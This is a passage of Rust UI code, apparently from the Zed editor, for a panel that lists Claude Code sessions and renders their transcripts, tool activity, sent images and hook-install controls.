        self.entries.clear();
        self.list_state.reset(0);
        self.rebuild_entries(cx);
        cx.notify();
    }

    fn toggle_turn_summary(&mut self, turn_id: SharedString, cx: &mut Context<Self>) {
        if !self.expanded.remove(&turn_id) {
            self.expanded.insert(turn_id);
        }
        self.rebuild_entries(cx);
        cx.notify();
    }

    fn toggle_now_row(&mut self, cx: &mut Context<Self>) {
        self.now_row_expanded = !self.now_row_expanded;
        cx.notify();
    }

    fn request_interrupt(&mut self, cx: &mut Context<Self>) {
        if !self.store.read(cx).can_interrupt() {
            return;
        }
        let now_ms = now_millis();
        if interrupt_is_awaiting_result(self.interrupt_sent_at_ms, now_ms) {
            return;
        }
        self.interrupt_sent_at_ms = Some(now_ms);
        let task = self.store.update(cx, |store, cx| store.interrupt(cx));
        task.detach_and_log_err(cx);
        cx.notify();
    }

    fn on_live_message_drag_move(
        &mut self,
        event: &DragMoveEvent<DraggedLiveMessageDivider>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let (start_y, start_height) = match self.live_message_drag {
            Some(drag) => drag,
            None => {
                let start = (event.event.position.y, self.live_message_height);
                self.live_message_drag = Some(start);
                start
            }
        };
        let delta = event.event.position.y - start_y;
        self.live_message_height = clamp_live_message_height(
            start_height - delta,
            window.rem_size(),
            window.bounds().size.height,
        );
        cx.notify();
    }

    fn displayed_rail_width(&self) -> Pixels {
        let available = self
            .rail_row_budget
            .unwrap_or_else(unconstrained_rail_budget);
        clamped_rail_width(self.rail_width, available)
    }

    fn remember_rail_budget(&mut self, row_width: Pixels, cx: &mut Context<Self>) {
        let budget = terminal_and_rail_budget(row_width, self.terminal.is_some());
        if self.rail_row_budget == Some(budget) {
            return;
        }
        self.rail_row_budget = Some(budget);
        let next = clamped_rail_width(self.rail_width, budget);
        if self.rail_width != next {
            self.rail_width = next;
            cx.notify();
        }
    }

    fn on_rail_drag_move(&mut self, event: &DragMoveEvent<DraggedRail>, cx: &mut Context<Self>) {
        if self.rail_drag_position == Some(event.event.position) {
            return;
        }
        self.rail_drag_position = Some(event.event.position);
        let budget = terminal_and_rail_budget(event.bounds.size.width, self.terminal.is_some());
        self.rail_row_budget = Some(budget);
        let requested = event.bounds.right() - event.event.position.x;
        let next = clamped_rail_width(requested, budget);
        if self.rail_width != next {
            self.rail_width = next;
            cx.notify();
        }
    }

    fn set_hovered_anchor(&mut self, next: Option<SharedString>, cx: &mut Context<Self>) {
        if !hover_anchor_changed(self.hovered_anchor.as_deref(), next.as_deref()) {
            return;
        }
        self.hovered_anchor = next;
        cx.notify();
    }

    fn open_zoomed_image(&mut self, key: SharedString, image: Arc<Image>, cx: &mut Context<Self>) {
        self.zoomed_image = Some(ZoomedImage { key, image });
        cx.notify();
    }

    fn render_zoomed_image(&mut self, cx: &mut Context<Self>) -> Option<AnyElement> {
        let zoomed = self.zoomed_image.clone()?;
        let overlay_id = SharedString::from(format!("claude-zoomed-image-{}", zoomed.key));
        let image_id = SharedString::from(format!("claude-zoomed-image-content-{}", zoomed.key));
        Some(
            div()
                .id(overlay_id)
                .absolute()
                .inset_0()
                .size_full()
                .occlude()
                .flex()
                .items_center()
                .justify_center()
                .bg(cx.theme().colors().background.opacity(0.8))
                .cursor_pointer()
                .on_click(cx.listener(|this, _, _, cx| {
                    this.zoomed_image = None;
                    cx.stop_propagation();
                    cx.notify();
                }))
                .child(
                    img(zoomed.image)
                        .id(image_id)
                        .max_w_full()
                        .max_h_full()
                        .on_click(cx.listener(|this, _, _, cx| {
                            this.zoomed_image = None;
                            cx.stop_propagation();
                            cx.notify();
                        })),
                )
                .into_any_element(),
        )
    }

    fn render_rail_resize_handle(&self, cx: &mut Context<Self>) -> AnyElement {
        let panel_id = cx.entity_id();
        div()
            .id(SharedString::from(format!(
                "claude-rail-resize-{panel_id:?}"
            )))
            .w(px(RAIL_RESIZE_HANDLE_PIXELS))
            .h_full()
            .flex_none()
            .cursor_col_resize()
            .occlude()
            .on_drag(DraggedRail, |rail, _, _, cx| {
                cx.stop_propagation();
                cx.new(|_| rail.clone())
            })
            .on_mouse_down(
                MouseButton::Left,
                cx.listener(|_, _: &MouseDownEvent, _, cx| {
                    cx.stop_propagation();
                }),
            )
            .on_mouse_up(
                MouseButton::Left,
                cx.listener(|this, event: &MouseUpEvent, _, cx| {
                    this.rail_drag_position = None;
                    if event.click_count == 2 {
                        let budget = this
                            .rail_row_budget
                            .unwrap_or_else(unconstrained_rail_budget);
                        let next = clamped_rail_width(px(RAIL_WIDTH_DEFAULT_PIXELS), budget);
                        if this.rail_width != next {
                            this.rail_width = next;
                            cx.notify();
                        }
                        cx.stop_propagation();
                    }
                }),
            )
            .into_any_element()
    }

    fn present_anchored_entry(
        &mut self,
        key: &SharedString,
        element: AnyElement,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let on_screen = self.anchored_on_screen.contains(key);
        let hovered = self.hovered_anchor.as_ref() == Some(key);
        let has_anchor = self
            .reachable_anchors
            .iter()
            .any(|anchor| anchor.anchor.key == key.as_ref());
        if !on_screen && !hovered && !has_anchor {
            return element;
        }
        let hover_key = key.clone();
        let accent = cx.theme().colors().icon_accent;
        let hover_background = cx.theme().colors().element_hover;
        div()
            .id(SharedString::from(format!("claude-anchored-entry-{key}")))
            .w_full()
            .when(on_screen, move |this| {
                this.border_l_2().border_color(accent)
            })
            .when(hovered, move |this| this.bg(hover_background))
            .when(has_anchor, |this| {
                this.on_hover(cx.listener(move |this, hovered, _, cx| {
                    let next = if *hovered {
                        Some(hover_key.clone())
                    } else {
                        None
                    };
                    this.set_hovered_anchor(next, cx);
                }))
            })
            .child(element)
            .into_any_element()
    }

    fn forget_live_message_markdown(&mut self) {
        if let Some(old_key) = self.live_message_markdown_key.take() {
            self.markdowns.remove(&old_key);
        }
    }

    fn toggle_full_history(&mut self, cx: &mut Context<Self>) {
        self.show_full_history = !self.show_full_history;
        // A different path is a different conversation as far as the list is concerned;
        // none of the measured heights line up with the new indices.
        self.entries.clear();
        self.list_state.reset(0);
        self.unread_below.reset();
        self.rebuild_entries(cx);
        cx.notify();
    }

    fn toggle_expanded(&mut self, key: SharedString, entry_index: usize, cx: &mut Context<Self>) {
        if !self.expanded.remove(&key) {
            self.expanded.insert(key);
        }
        // Only this item changed height, and remeasuring just it keeps the scroll
        // position anchored where the user left it.
        self.list_state
            .remeasure_items(entry_index..entry_index.saturating_add(1));
        cx.notify();
    }

    fn reveal_anchored_entry(&mut self, key: SharedString, cx: &mut Context<Self>) {
        // The index is the one from the latest rebuild, not the frame that drew the
        // chip: entries are replaced on a timer, and a captured index would scroll
        // to whatever later landed in that slot.
        let Some(index) = self
            .reachable_anchors
            .iter()
            .find(|anchor| anchor.anchor.key == key.as_ref())
            .map(|anchor| anchor.index)
        else {
            return;
        };
        let Some(entry) = self.entries.get(index) else {
            return;
        };
        if entry.key == key && !self.expanded.contains(&entry.key) {
            let entry_key = entry.key.clone();
            self.toggle_expanded(entry_key, index, cx);
        }
        self.list_state.scroll_to_reveal_item(index);
        cx.notify();
    }

    fn rebuild_entries(&mut self, cx: &mut Context<Self>) {
        self.refresh_entry_cache(cx);

        // Pending sends were the only reader of a `/clear` rebind. The store still
        // records one pair per `/clear` of the selected session and keeps every pair
        // until something takes it, and the store lives as long as this panel does.
        drop(
            self.store
                .update(cx, |store, _cx| store.take_cleared_rebinds()),
        );

        // Moved out for the duration of the build so that the transcript can be borrowed
        // from the store, which is reached through `self`, at the same time.
        let mut cache = std::mem::take(&mut self.entry_cache);
        let (mut new_entries, billing, activity, agent_calls, patched_calls) = {
            let store = self.store.read(cx);
            let home_directory = store.home_directory();
            let transcript = store.transcript();
            let path = if self.show_full_history {
                transcript.full_path()
            } else {
                transcript.active_path()
            };
            // Activity is about the session, not whichever agent conversation is open.
            let session_path = store.main_transcript().active_path();
            let live = store.live();
            let activity = if live.last_event_at_ms == 0 {
                activity(&session_path)
            } else if let Some(tool) = live.running_tools.last() {
                Activity::RunningTool {
                    name: SharedString::from(tool.name.clone()),
                    target: tool_target(&serde_json::json!({
                        "name": tool.name,
                        "input": tool.input,
                    })),
                }
            } else if matches!(live.turn, Turn::Running { .. }) {
                Activity::Thinking
            } else {
                Activity::Idle
            };
            (
                build_entries(&path, home_directory, &mut cache),
                billing_of_path(&path),
                activity,
                agent_calls(&path),
                calls_answered_with_a_patch(&path),
            )
        };
        self.entry_cache = cache;
        // Taken before collapse. A streaming rewrite can change a record's usage without
        // changing the entry derived from it, and the early return below would otherwise
        // leave the card on the previous snapshot.
        self.turn_bills = turn_bills(&new_entries, &billing);
        self.billing = billing;
        self.activity = activity;
        self.agent_calls = agent_calls;
        self.patched_calls = patched_calls;

        let turn_running = matches!(self.store.read(cx).live().turn, Turn::Running { .. });
        if !turn_running {
            self.interrupt_sent_at_ms = None;
        }
        // Collapse consumes the list. The anchors have to be taken from the copy,
        // because a finished turn's tool rows are what the terminal still shows.
        let pre_collapse = new_entries.clone();
        new_entries = collapse_turns(
            new_entries,
            &self.expanded,
            self.show_tool_calls,
            turn_running,
            &self.agent_calls,
            &self.entry_cache.timestamps,
        );

        // Answer state is aimed at one call, not at "something is pending": the tool a
        // reader allowed can finish and the next permission be asked for inside a single
        // poll, and the prompt that arrives then has been answered by nobody.
        let asking_permission = {
            let live = self.store.read(cx).live();
            live.pending_permission
                .as_ref()
                .map(|permission| SharedString::from(permission.tool_use_id.clone()))
        };
        if self.permission_answered_for != asking_permission {
            self.permission_answered = false;
            self.permission_answered_for = None;
        }

        if matches!(
            self.store.read(cx).transcript_target(),
            TranscriptTarget::Main
        ) {
            let store = self.store.read(cx);
            new_entries.extend(queued_entries(store.transcript().queued_messages()));
        }

        let anchors = reachable_anchors(&pre_collapse, &new_entries);
        let anchors_changed = !same_anchor_identity(&self.reachable_anchors, &anchors);
        self.reachable_anchors = anchors;

        let old_length = self.entries.len();
        let new_length = new_entries.len();
        let common_prefix = self
            .entries
            .iter()
            .zip(new_entries.iter())
            .take_while(|(old, new)| old == new)
            .count();
        // A suffix is matched as well as a prefix because the entries that change are
        // rarely at one end: the context section sits at the top and gains an attachment
        // on nearly every turn, while the message being streamed is at the bottom.
        // Splicing only the span between them keeps every other item's measured height,
        // and with it the reader's scroll position.
        let unmatched = old_length.min(new_length).saturating_sub(common_prefix);
        let common_suffix = (0..unmatched)
            .take_while(|offset| {
                let old = self.entries.get(old_length - 1 - offset);
                let new = new_entries.get(new_length - 1 - offset);
                matches!((old, new), (Some(old), Some(new)) if old == new)
            })
            .count();

        let changed_old = common_prefix..(old_length - common_suffix);
        let changed_count = (new_length - common_suffix) - common_prefix;
        if changed_old.is_empty() && changed_count == 0 {
            // The collapsed list can stay put while a hidden tool row's text changes.
            // The alignment cache keys off this generation, so it has to move too.
            if anchors_changed {
                self.entries_generation = self.entries_generation.wrapping_add(1);
            }
            return;
        }

        // Captured before the splice, which itself moves the scroll position. A `None`
        // from the list is not an answer, so the last definite one stands.
        if let Some(at_end) = self.list_state.is_scrolled_to_end() {
            self.scrolled_to_end = at_end;
        }
        let was_scrolled_to_end = self.scrolled_to_end;

        // What arrived is counted against where the reader was sitting: at the bottom it
        // is scrolled into view below, and anywhere else it lands out of sight, which is
        // what makes a session that is still answering look like one that has stopped.
        let arrived = new_length.saturating_sub(old_length);
        self.unread_below
            .entries_arrived(arrived, was_scrolled_to_end);

        self.entries = new_entries;
        self.entries_generation = self.entries_generation.wrapping_add(1);
        self.list_state.splice(changed_old, changed_count);

        let live_keys = self.live_cache_keys();
        self.markdowns.retain(|key, _| live_keys.contains(key));
        self.expanded.retain(|key| live_keys.contains(key));
        self.loaded_outputs.retain(|key, _| live_keys.contains(key));
        self.output_loads.retain(|key, _| live_keys.contains(key));
        self.dispatch_prompts
            .retain(|key, _| live_keys.contains(key));
        self.loaded_attachments
            .retain(|key, _| live_keys.contains(key));
        self.attachment_loads
            .retain(|key, _| live_keys.contains(key));
        self.entry_cache.retain_keys(&live_keys);

        if was_scrolled_to_end {
            self.list_state.scroll_to_end();
        }
    }

    /// Drops what the entry cache can no longer be trusted with: everything, when the
    /// transcript has been thrown away and is being read again from the start, and one
    /// record's artifacts when `absorb` has replaced that record.
    fn refresh_entry_cache(&mut self, cx: &mut Context<Self>) {
        let (generation, home_directory, overwritten_uuids) = {
            let store = self.store.read(cx);
            (
                store.transcript_generation(),
                store.home_directory().map(Path::to_path_buf),
                store.transcript().overwritten_uuids().to_vec(),
            )
        };

        // A cached entry carries the decision of whether its persisted output can be
        // read back, and that decision was made against the home directory known at the
        // time. The first scan of a remote project turns that from unknown into an
        // answer, so entries derived before it have to be derived again.
        if generation != self.cached_transcript_generation
            || home_directory != self.cached_home_directory
        {
            self.cached_transcript_generation = generation;
            self.cached_home_directory = home_directory;
            self.entry_cache = EntryCache::default();
            self.overwrites_dropped = 0;
        }

        if let Some(new_overwrites) = overwritten_uuids.get(self.overwrites_dropped..) {
            for uuid in new_overwrites {
                self.entry_cache.forget_record(uuid);
            }
        }
        self.overwrites_dropped = overwritten_uuids.len();
    }

    /// Every key that may address a cached artifact, including the attachment keys that
    /// live inside the single context entry rather than being entries themselves.
    fn live_cache_keys(&self) -> HashSet<SharedString> {
        let mut keys = live_cache_keys(&self.entries);
        keys.insert(SharedString::from(NOW_ROW_ENTRY_KEY));
        if let Some(key) = &self.live_message_markdown_key {
            keys.insert(key.clone());
        }
        keys
    }

    fn markdown_for(
        &mut self,
        key: &SharedString,
        source: SharedString,
        cx: &mut Context<Self>,
    ) -> Entity<Markdown> {
        if let Some(existing) = self.markdowns.get(key).cloned() {
            if existing.read(cx).source() != &source {
                existing.update(cx, |markdown, cx| markdown.reset(source, cx));
            }
            return existing;
        }

        // Fetched here rather than held in a field so that this crate does not have to
        // depend on `language` just to name the registry's type.
        let language_registry = self
            .workspace
            .upgrade()
            .map(|workspace| workspace.read(cx).project().read(cx).languages().clone());
        let markdown = cx.new(|cx| Markdown::new(source, language_registry, None, cx));
        self.markdowns.insert(key.clone(), markdown.clone());
        markdown
    }

    fn load_full_output(
        &mut self,
        key: SharedString,
        path: PathBuf,
        entry_index: usize,
        cx: &mut Context<Self>,
    ) {
        // The boundary is enforced here as well as where the button is drawn, so that the
        // path is checked on the line before it is opened rather than only where the
        // offer was made.
        let home_directory = self.store.read(cx).home_directory().map(Path::to_path_buf);
        if !persisted_output_is_loadable(&path, home_directory.as_deref()) {
            return;
        }

        if matches!(
            self.loaded_outputs.get(&key),
            Some(OutputLoad::Loading) | Some(OutputLoad::Loaded(_))
        ) {
            return;
        }

        self.loaded_outputs.insert(key.clone(), OutputLoad::Loading);
        let read = self.source.read_file(path, MAX_PERSISTED_OUTPUT_BYTES);
        let load = cx.spawn({
            let key = key.clone();
            async move |this, cx| {
                let result = read.await;
                this.update(cx, |this, cx| {
                    let load = match result {
                        Ok(contents) => OutputLoad::Loaded(persisted_output_text(contents).into()),
                        Err(error) => OutputLoad::Failed(format!("{error:#}").into()),
                    };
                    this.loaded_outputs.insert(key, load);
                    this.list_state
                        .remeasure_items(entry_index..entry_index.saturating_add(1));
                    cx.notify();
                })
                .log_err();
            }
        });
        // Held so that the read is cancelled if the entry it belongs to goes away.
        self.output_loads.insert(key, load);
        cx.notify();
    }

    /// The session the conversation on screen belongs to, which is the session whose
    /// working directory a sent file is judged against.
    fn selected_session(&self, cx: &App) -> Option<RegisteredSession> {
        let store = self.store.read(cx);
        store.selected_session().cloned()
    }

    /// Fetches a sent image from the machine the session runs on.
    ///
    /// Started from the draw of the entry that shows it rather than from a button: an
    /// image is what the session sent, and one behind a button is one the reader has to
    /// be told to ask for. The states in `loaded_attachments` are what stops the draw
    /// after this one starting the read again.
    fn load_sent_image(
        &mut self,
        key: SharedString,
        file: &SentFile,
        entry_index: usize,
        cx: &mut Context<Self>,
    ) {
        if self.loaded_attachments.contains_key(&key) {
            return;
        }
        let Some(session) = self.selected_session(cx) else {
            return;
        };
        let Some(format) = sent_image_format(file) else {
            return;
        };

        self.loaded_attachments
            .insert(key.clone(), AttachmentLoad::Loading);
        let max_bytes = if self.forced_attachment_loads.contains(&key) {
            MAX_SENT_IMAGE_BYTES_ABSOLUTE
        } else {
            MAX_SENT_IMAGE_BYTES
        };
        let read = self
            .source
            .read_attachment(session.session_id, file.path.clone(), max_bytes);
        let load = cx.spawn({
            let key = key.clone();
            async move |this, cx| {
                let result = read.await;
                this.update(cx, |this, cx| {
                    let load = match result {
                        // A truncated read is a prefix of the file, and a prefix of an
                        // image decodes into nothing recognizable, so it is reported as
                        // the size limit it is rather than as a broken image.
                        Ok(contents) if contents.truncated => {
                            AttachmentLoad::Failed(SharedString::from(format!(
                                "larger than the {} this panel will fetch",
                                describe_byte_count(max_bytes)
                            )))
                        }
                        Ok(contents) if contents.bytes.is_empty() => {
                            AttachmentLoad::Failed(SharedString::from("the file is empty"))
                        }
                        Ok(contents) => AttachmentLoad::Loaded(Arc::new(Image::from_bytes(
                            format,
                            contents.bytes,
                        ))),
                        Err(error) => AttachmentLoad::Failed(format!("{error:#}").into()),
                    };
                    this.loaded_attachments.insert(key, load);
                    this.list_state
                        .remeasure_items(entry_index..entry_index.saturating_add(1));
                    cx.notify();
                })
                .log_err();
            }
        });
        // Held so that the read is cancelled if the entry it belongs to goes away.
        self.attachment_loads.insert(key, load);
    }

    fn open_sent_path(&mut self, path: PathBuf, cx: &mut Context<Self>) {
        let Some(session) = self.selected_session(cx) else {
            return;
        };
        if !sent_path_is_openable(&path, &session.working_directory) {
            return;
        }

        if !self.source.is_remote() && path.exists() {
            cx.open_with_system(&path);
            return;
        }

        let file_name = path
            .file_name()
            .map(|name| name.to_string_lossy().into_owned())
            .unwrap_or_else(|| "sent-file".to_string());
        let read =
            self.source
                .read_attachment(session.session_id, path, MAX_SENT_IMAGE_BYTES_ABSOLUTE);
        let open = cx.spawn(async move |this, cx| {
            let result = read.await;
            this.update(cx, |_, cx| match result {
                Ok(contents) => {
                    let temp = std::env::temp_dir().join(file_name);
                    if std::fs::write(&temp, &contents.bytes)
                        .map_err(|error| anyhow::anyhow!("writing sent file to temp: {error}"))
                        .log_err()
                        .is_some()
                    {
                        cx.open_with_system(&temp);
                    }
                }
                Err(error) => {
                    Err::<(), _>(error).log_err();
                }
            })
            .log_err();
        });
        open.detach();
    }

    fn display_working_directory(&self, working_directory: &Path) -> SharedString {
        if let Some(project_root) = self.project_root.as_deref() {
            if let Ok(relative) = working_directory.strip_prefix(project_root) {
                let relative = relative.to_string_lossy();
                return if relative.is_empty() {
                    SharedString::from(".")
                } else {
                    SharedString::from(relative.into_owned())
                };
            }
        }

        match working_directory.strip_prefix(paths::home_dir()) {
            Ok(relative) => SharedString::from(format!("~/{}", relative.to_string_lossy())),
            Err(_) => SharedString::from(working_directory.to_string_lossy().into_owned()),
        }
    }

    fn render_session_section(&mut self, cx: &mut Context<Self>) -> impl IntoElement {
        let store = self.store.read(cx);
        let rows = store.session_rows();
        let selected = store.selected().map(str::to_string);
        let error = store.error().cloned();
        let notice = store.notice().cloned();
        let agents_unavailable = store.agents_unavailable_reason().cloned();
        let liveness_unavailable = store.liveness_unavailable_reason().cloned();
        let stale = store
            .stale_for(now_millis().max(0) as u64)
            .map(|(which, overdue_ms)| {
                SharedString::from(format!("stale: {which} {} s", overdue_ms / 1000))
            });
        let ai_title = store.main_transcript().ai_title();
        let selected_name = rows.iter().find_map(|row| {
            (Some(row.session_id()) == selected.as_deref()).then(|| match row {
                SessionRow::Live(live) => preferred_session_name(&live.session, ai_title),
                SessionRow::Ended(ended) => preferred_name(
                    ended.ai_title.as_deref(),
                    ended.name.as_deref(),
                    ended.session_id.as_str(),
                ),
            })
        });
        let summary = collapsed_sessions_summary(rows.len(), selected_name.as_deref());
        let hooks_installed = store.hooks_installed();
        let offer_hooks = !hooks_installed && !rows.is_empty();
        let is_expanded = self.session_list_expanded;
        let agent_rows: Vec<Vec<SessionAgentRow>> = {
            let store = self.store.read(cx);
            let open_target = store.transcript_target().clone();
            let main_transcript = store.main_transcript();
            let main_path = main_transcript.active_path();
            let shells = background_shells(&main_transcript.full_path());
            rows.iter()
                .map(|row| match row {
                    SessionRow::Live(live) => {
                        let is_selected =
                            selected.as_deref() == Some(live.session.session_id.as_str());
                        let main_path: &[&TranscriptRecord] =
                            if is_selected { &main_path } else { &[] };
                        let shells: &[BackgroundShell] = if is_selected { &shells } else { &[] };
                        session_agent_rows(
                            store.subagents_of(&live.session.session_id),
                            shells,
                            main_path,
                            &open_target,
                        )
                    }
                    SessionRow::Ended(_) => Vec::new(),
                })
                .collect()
        };

        v_flex()
            .size_full()
            .child(
                h_flex()
                    .p_1()
                    .gap_1()
                    .justify_between()
                    .child(
                        h_flex()
                            .gap_1()
                            .overflow_hidden()
                            .child(
                                Disclosure::new("claude-sessions-list-disclosure", is_expanded)
                                    .on_click(
                                        cx.listener(|this, _, _, cx| this.toggle_session_list(cx)),
                                    ),
                            )
                            .child(
                                Label::new("Claude Sessions")
                                    .size(LabelSize::Small)
                                    .color(Color::Muted),
                            ),
                    )
                    // Collapsed, this line is all that is left of the list, so it carries
                    // what the rows were saying: how many are running and which one the
                    // conversation below belongs to.
                    .child(
                        h_flex()
                            .gap_1()
                            .child(
                                Label::new(summary)
                                    .size(LabelSize::XSmall)
                                    .color(Color::Muted)
                                    .single_line(),
                            )
                            .when_some(stale, |this, stale| {
                                this.child(
                                    Label::new(stale)
                                        .size(LabelSize::XSmall)
                                        .color(Color::Warning)
                                        .single_line(),
                                )
                            })
                            .when(offer_hooks, |this| {
                                this.child(
                                    Button::new(
                                        "claude-sessions-install-hooks",
                                        "Install hooks",
                                    )
                                    .label_size(LabelSize::XSmall)
                                    .style(ButtonStyle::Tinted(TintColor::Accent))
                                    .tooltip(Tooltip::text(
                                        "Installs the event dispatcher and status line \
                                         wrapper Claude Code runs. Your settings are \
                                         copied aside first. Sessions already running \
                                         pick them up when they next start.",
                                    ))
                                    .on_click(
                                        cx.listener(|this, _, _, cx| {
                                            this.install_hooks(cx)
                                        }),
                                    ),
                                )
                            })
                            .when(hooks_installed, |this| {
                                this.child(
                                    Button::new(
                                        "claude-sessions-uninstall-hooks",
                                        "Uninstall hooks",
                                    )
                                    .label_size(LabelSize::XSmall)
                                    .tooltip(Tooltip::text(
                                        "Removes Zed's Claude hooks and channel server. The MCP registration is left in place.",
                                    ))
                                    .on_click(cx.listener(|this, _, _, cx| {
                                        this.uninstall_hooks(cx)
                                    })),
                                )
                            })
                            .when(!self.in_pane, |this| {
                                this.child(
                                    IconButton::new(
                                        "claude-sessions-open-in-editor",
                                        IconName::ArrowUpRight,
                                    )
                                    .icon_size(IconSize::Small)
                                    .tooltip(Tooltip::text("Open in Editor"))
                                    .on_click(cx.listener(
                                        |_this, _, window, cx| {
                                            window.dispatch_action(Box::new(OpenInEditor), cx);
                                        },
                                    )),
                                )
                            }),
                    ),
            )
            .when_some(error, |this, error| {
                this.child(
                    div().px_2().pb_1().child(
                        Label::new(error)
                            .size(LabelSize::XSmall)
                            .color(Color::Error),
                    ),
                )
            })
            .when_some(notice, |this, notice| {
                this.child(
                    div().px_2().pb_1().child(
                        Label::new(notice)
                            .size(LabelSize::XSmall)
                            .color(Color::Muted),
                    ),
                )
            })
            .when_some(agents_unavailable, |this, reason| {
                this.child(
                    div().px_2().pb_1().child(
                        Label::new(reason)
                            .size(LabelSize::XSmall)
                            .color(Color::Muted),
                    ),
                )
            })
            .when_some(liveness_unavailable, |this, reason| {
                this.child(
                    div().px_2().pb_1().child(
                        Label::new(reason)
                            .size(LabelSize::XSmall)
                            .color(Color::Muted),
                    ),
                )
            })
            .when_some(self.lifecycle_note.clone(), |this, note| {
                this.child(
                    div().px_2().pb_1().child(
                        Label::new(note).size(LabelSize::XSmall).color(Color::Muted),
                    ),
                )
            })
            .when_some(self.hook_install_note.clone(), |this, note| {
                this.child(
                    div()
                        .px_2()
                        .pb_1()
                        .child(Label::new(note).size(LabelSize::XSmall).color(Color::Muted)),
                )
            })
            .when(is_expanded, |this| {
                this.child(
                    v_flex()
                        .id("claude-sessions-list")
                        .size_full()
                        .flex_1()
                        .overflow_y_scroll()
                        .when(rows.is_empty(), |this| {
                            this.child(
                                div().p_2().child(
                                    Label::new(NO_SESSIONS)
                                        .size(LabelSize::Small)
                                        .color(Color::Muted),
                                ),
                            )
                        })
                        .children(rows.iter().enumerate().zip(agent_rows).map(
                            |((index, row), agents)| {
                                let session_id = row.session_id().to_string();
                                let is_selected = selected.as_deref() == Some(session_id.as_str());
                                let agents_shown = (!agents.is_empty()).then(|| {
                                    !self.collapsed_session_agents.contains(&session_id)
                                });
                                v_flex()
                                    .child(match row {
                                        SessionRow::Live(live) => self.render_live_session_row(
                                            index,
                                            live,
                                            is_selected,
                                            agents_shown,
                                            cx,
                                        ),
                                        SessionRow::Ended(ended) => self.render_ended_session_row(
                                            index,
                                            ended,
                                            is_selected,
                                            cx,
                                        ),
                                    })
                                    .children(
                                        (agents_shown == Some(true))
                                            .then(|| {
                                                self.render_session_agent_rows(
                                                    session_id, agents, cx,
                                                )
                                            })
                                            .unwrap_or_default(),
                                    )
                            },
                        )),
                )
            })
    }

    /// The agents one listed session has spawned, drawn under its row so that a session
    /// the reader has not opened still says what it is running. Opening one opens it as a
    /// tab of that session's own, which is the only way to read two sessions' agents at
    /// once.
    ///
    /// The summaries are taken before any element is built: reading the store borrows the
    /// context that the click handlers need to be registered against.
    fn render_session_agent_rows(
        &self,
        session_id: String,
        rows: Vec<SessionAgentRow>,
        cx: &mut Context<Self>,
    ) -> Vec<ListItem> {
        rows.into_iter()
            .enumerate()
            .map(|(index, row)| match row {
                SessionAgentRow::WorkflowRun { label, note } => ListItem::new(SharedString::from(
                    format!("claude-session-run-{session_id}-{index}"),
                ))
                .spacing(ListItemSpacing::Sparse)
                .indent_level(1)
                .start_slot(
                    Icon::new(IconName::ListTree)
                        .size(IconSize::XSmall)
                        .color(Color::Muted),
                )
                .child(agent_row_body(label, Some(note), Color::Default)),
                SessionAgentRow::Agent {
                    label,
                    note,
                    indent_level,
                    target,
                } => ListItem::new(SharedString::from(format!(
                    "claude-session-agent-{session_id}-{index}"
                )))
                .spacing(ListItemSpacing::Sparse)
                .indent_level(indent_level)
                .start_slot(
                    Icon::new(IconName::Thread)
                        .size(IconSize::XSmall)
                        .color(Color::Muted),
                )
                .on_click({
                    let session_id = session_id.clone();
                    cx.listener(move |this, _, window, cx| {
                        this.reveal_in_pane(Some(session_id.clone()), target.clone(), window, cx)
                    })
                })
                .child(agent_row_body(label, note, Color::Muted)),
                SessionAgentRow::Shell { label, note } => ListItem::new(SharedString::from(
                    format!("claude-session-shell-{session_id}-{index}"),
                ))
                .spacing(ListItemSpacing::Sparse)
                .indent_level(1)
                .start_slot(
                    Icon::new(IconName::Terminal)
                        .size(IconSize::XSmall)
                        .color(Color::Muted),
                )
                .child(agent_row_body(label, Some(note), Color::Muted)),
            })
            .collect()
    }

    fn render_live_session_row(
        &self,
        index: usize,
        live: &LiveSession,
        is_selected: bool,
        // `Some` when the session has agent rows under it, saying whether they are
        // showing; `None` when it has none and so nothing to fold away.
        agents_shown: Option<bool>,
        cx: &mut Context<Self>,
    ) -> ListItem {
        let session = &live.session;
        let session_id = session.session_id.clone();
        let process_id = session.process_id;
        let waiting_for = live.waiting_for.clone();
        let background = live.background;
        let agent_id = live.agent_id.clone();
        let tmux_target = session.tmux_target.clone();
        let cwd = session.working_directory.clone();
        let (is_busy, is_waiting, context_percent, claude_ai_url) = {
            let store = self.store.read(cx);
            let waiting = is_selected
                && (store.live().pending_permission.is_some()
                    || store.live().pending_question.is_some());
            let running = is_selected && matches!(store.live().turn, Turn::Running { .. });
            let is_busy = running || session.status.as_deref() == Some("busy");
            let context_percent = is_selected
                .then(|| {
                    store
                        .status()
                        .and_then(|status| status.context_used_percentage)
                })
                .flatten();
            let claude_ai_url = claude_ai_session_url(
                store
                    .main_transcript()
                    .bridge_session_id()
                    .filter(|_| is_selected)
                    .or(session.bridge_session_id.as_deref()),
            );
            (is_busy, waiting, context_percent, claude_ai_url)
        };
        let selected_title = is_selected.then(|| {
            self.store
                .read(cx)
                .main_transcript()
                .ai_title()
                .map(str::to_string)
        });
        let name = SharedString::from(preferred_session_name(
            session,
            selected_title.as_ref().and_then(|title| title.as_deref()),
        ));
        let working_directory = self.display_working_directory(&session.working_directory);
        let spend = self.store.read(cx).session_spend(&session.session_id);
        let context = context_percent.map(|percent| SharedString::from(format!("{percent:.0}%")));
        let cost = spend
            .and_then(|spend| spend.total_cost_usd)
            .map(|total| SharedString::from(format_usd(total)));
        // How long the session has sat without changing what it is doing. Said because
        // every listed process is alive — `updatedAt` is not a heartbeat, so a session is
        // never filtered out for being quiet — and this is what tells one in use from one
        // left open two days ago.
        let idle = idle_for(session.updated_at, now_millis());
        // Bracketed and before the name, because a session is found by which tmux
        // session it is running in as often as by what Claude Code called it.
        let tmux_session = session
            .tmux_target
            .as_deref()
            .and_then(tmux_session_name)
            .map(|name| SharedString::from(format!("[{name}]")));
        let is_bridged = session.bridge_session_id.is_some();

        // Wrapped so that the pulse can be applied to the element: the icon itself
        // carries a colour rather than an opacity.
        let indicator = div().child(Icon::new(IconName::Indicator).size(IconSize::XSmall).color(
            if is_waiting {
                Color::Warning
            } else if is_busy {
                Color::Success
            } else {
                Color::Hidden
            },
        ));
        let indicator = if is_busy || is_waiting {
            indicator
                .with_animation(
                    SharedString::from(format!("claude-session-indicator-{index}")),
                    Animation::new(PULSE_PERIOD)
                        .repeat()
                        .with_easing(pulsating_between(0.2, 0.8)),
                    |indicator, delta| indicator.opacity(delta),
                )
                .into_any_element()
        } else {
            indicator.into_any_element()
        };

        // The disclosure sits inside the row rather than in `ListItem::toggle`, which
